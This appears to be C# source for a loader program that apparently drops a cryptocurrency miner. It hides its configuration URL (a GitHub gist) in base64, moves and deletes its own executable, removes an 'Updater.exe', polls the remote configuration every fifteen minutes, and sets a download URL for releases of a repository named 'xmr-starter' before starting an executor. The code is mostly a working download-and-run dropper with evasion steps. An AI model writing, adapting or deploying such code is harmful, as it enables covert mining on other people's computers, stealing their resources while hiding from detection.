
using System;
using System.Collections;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace nddi
{
    public static class Program
    {
        private static string GistsUrl
        {
            get
            {
                return Encoding.ASCII.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS96b29sb29ob28vZjMzYTE5ZWZhMzQzYWU0MDg5ZjNlYTA3MzU2MTMzY2UvcmF3"));
            }
        }
        private static string ExecutableFileName;

        internal static string RunningDirectory;

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        static void Main(string[] args)
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            string currentDir = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            try
            {
                string fileName = Path.GetFileNameWithoutExtension(Assembly.GetEntryAssembly().Location) + ".bak";
                string bakFile = Path.Combine(currentDir, fileName);

                if (File.Exists(bakFile))
                {
                    File.Delete(bakFile);
                }

                File.Move(Assembly.GetEntryAssembly().Location, bakFile);
                File.Delete(bakFile);
            }
            catch (Exception)
            { }

            try
            {
                string toRemoveUpdater = Path.Combine(currentDir, "Updater.exe");
                if (File.Exists(toRemoveUpdater))
                {
                    File.Delete(toRemoveUpdater);
                }
            }
            catch(Exception)
            { }


            ExecutableFileName = Path.GetFileName(Assembly.GetEntryAssembly().Location);
            RunningDirectory = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);

            Configuration config = new Configuration(GistsUrl);

            config.DefaultConfigNode.UpdateConfigurationTimeSpan = new TimeSpan(0, 15, 0);
#if DEBUG
            config.DefaultConfigNode.UpdateConfigurationTimeSpan = new TimeSpan(0, 0, 30);
#endif

            config.DefaultConfigNode.SetDownloadUrl("nddir", "https://github.com/zooloohoo/xmr-starter/releases/download/LATEST/");


            Executor executor = new Executor(config);
            executor.Start(args);
        }

        private static string GetInstalledDirectory()
        {
            string installDir = null;
            installDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            if (!Directory.Exists(installDir))
            {
                try
                {
                    Directory.CreateDirectory(installDir);
                }
                catch
                {
                    installDir = "c:\\";
                }
            }

            return installDir;
        }
    }
}
